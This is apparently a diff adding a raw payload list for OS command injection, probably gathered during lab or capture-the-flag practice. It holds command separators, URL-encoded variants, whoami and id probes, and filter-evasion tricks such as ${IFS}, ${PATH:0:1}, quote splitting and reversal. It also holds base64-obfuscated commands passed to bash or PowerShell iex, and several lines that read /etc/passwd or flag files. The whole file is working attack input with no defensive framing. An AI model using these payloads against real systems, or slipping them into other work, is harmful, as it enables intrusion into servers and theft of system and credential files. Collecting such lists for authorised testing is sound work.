@@ -1,0 +1,147 @@
+;
+%3b
+\n
++
+++
+&
+%26
+&&
+%26%26
+|
+%7c
+||
+%7c%7c
+``
+%60%60
+$()
+%24%28%29
+%09
+' , ; -- /* */
+; &&
+* ( ) & |
+' or and not substring concat count
+; & |
+' ; -- /* */ $() ${} #{} %{} ^
+../ ..\\ %00
+; & |
+' ; -- /* */
+\x \u %u %n
+\n \r\n \t %0d %0a %09
+&&whoami
+%26%26whoami
+||whoami
+1||whoami
+127.0.0.1\n
+127.0.0.1%0a
+127.0.0.1&
+127.0.0.1%26
+127.0.0.1|
+127.0.0.1||
+127.0.0.1%7c
+127.0.0.1%7c%7c
+127.0.0.1\n
+127.0.0.1\nls -la
+127.0.0.1%0a
+127.0.0.1%0a{ls,-la}
+127.0.0.1%0a%0a${IFS}{ls,-la}
+${IFS}
+${PATH:0:1}
+${LS_COLORS:10:1}
+127.0.0.1${LS_COLORS:10:1}${IFS}
+$(id)
+%0a$(id)
+$(i'd')
+%0a$(i'd')
+%2b$(i'd')
+%0a$(p'w'd)
+%2b$(p'w'd)
+%HOMEPATH:~6,-11%
+$env:HOMEPATH[0]
+$env:PROGRAMFILES[10]
+127.0.0.1${LS_COLORS:10:1}${IFS}
+127.0.0.1%0a${PATH:0:1}
+127.0.0.1%0a${PATH:0:1}bin${PATH:0:1}ls${IFS}${PATH:0:1}home
+%0a${PATH:0:1}bin${PATH:0:1}ls${IFS}${PATH:0:1}home
+{PATH:0:1}bin${PATH:0:1}ls${IFS}${PATH:0:1}home
+127.0.0.1\n/bin/ls /home
+w'h'o'am'i
+$(w'h'o'am'i)
+p'w'd
+p'w'd'
+$(p'w'd)
+$(p'w'd')
+w"h"o"am"i
+$(w"h"o"am"i)
+w\ho\am\i
+$(w\ho\am\i)
+who^ami
+$(who^ami)
+%0a${PATH:0:1}bin${PATH:0:1}vi${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+%2b${PATH:0:1}bin${PATH:0:1}vi${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+{PATH:0:1}bin${PATH:0:1}vi${IFS}${PATH:0:1}home${PATH:0:1}1nj3c70r${PATH:0:1}flag.txt
+WhOaMi
+$(WhOaMi)
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
+$(tr${IFS}"[A-Z]"${IFS}"[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+$(a="WhOaMi";printf%09%s%09"${a,,}")
+$(a="WhOaMi";printf${IFS}%s${IFS}"${a,,}")
+echo 'whoami' | rev
+'whoami'${IFS}|${IFS}rev
+$(rev<<<'imaohw')
+whoami"[-1..-20] -join ''
+whoami"[-1..-20]%09-join%09''
+iex "$('imaohw'[-1..-20] -join '')"
+iex%09"$('imaohw'[-1..-20]%09-join%09'')"
+iex${IFS}"$('imaohw'[-1..-20]${IFS}-join${IFS}'')"
+bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+bash<<<$(base64%09-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+bash<<<$(base64${IFS}-d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)
+iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+iex%09"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+iex${IFS}"$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"
+bash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
+%0abash<<<$(base64 -d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
+%0abash<<<$(base64%09-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
+%0abash<<<$(base64${IFS}-d<<<ZmluZCAvdXNyL3NoYXJlLyB8IGdyZXAgcm9vdCB8IGdyZXAgbXlzcWwgfCB0YWlsIC1uIDE=)
+WhOaMi
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(tr%09"[A-Z]" %09"[a-z]"<<<"WhOaMi")
+%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+%0a$(tr%09"[A-Z]" %09"[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+%0a$(a="WhOaMi";printf %s "${a,,}")
+echo 'whoami' | rev
+$(rev<<<'imaohw')
+%0a$(rev<<<'imaohw')
+"whoami"[-1..-20] -join ''
+%0a"whoami"[-1..-20] -join ''
+iex "$('imaohw'[-1..-20] -join '')"
+%0a iex "$('imaohw'[-1..-20] -join '')"
+WhOaMi
+$(WhOaMi)
+$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
+%0a$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")
+%0a$(tr%09"[A-Z]"%09"[a-z]"<<<"WhOaMi")
+$(tr${IFS}"[A-Z]"${IFS}"[a-z]"<<<"WhOaMi")
+%0a$(tr${IFS}"[A-Z]"${IFS}"[a-z]"<<<"WhOaMi")
+$(a="WhOaMi";printf %s "${a,,}")
+%0a$(a="WhOaMi";printf %s "${a,,}")
+$(a="WhOaMi";printf%09%s%09"${a,,}")
+%0a$(a="WhOaMi";printf${IFS}%s${IFS}"${a,,}")
+echo 'whoami' | rev
+$(rev<<<'imaohw')
+%0a$(rev<<<'imaohw')
+"whoami"[-1..-20] -join ''
+%0a"whoami"[-1..-20] -join ''
+iex "$('imaohw'[-1..-20] -join '')"
+%0a iex "$('imaohw'[-1..-20] -join '')"
+iex%09"$('imaohw'[-1..-20]%09-join '')"
+%0a$(IFS)iex$(IFS)"$('imaohw'[-1..-20]$(IFS)-join '')"
+$(c'a't${IFS}${PATH:0:1}flag.txt)
+$(c'a't${IFS}${PATH:0:1}*.txt)
+%0a$(c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd)
+$(c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd)
+%2b$(c'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd)
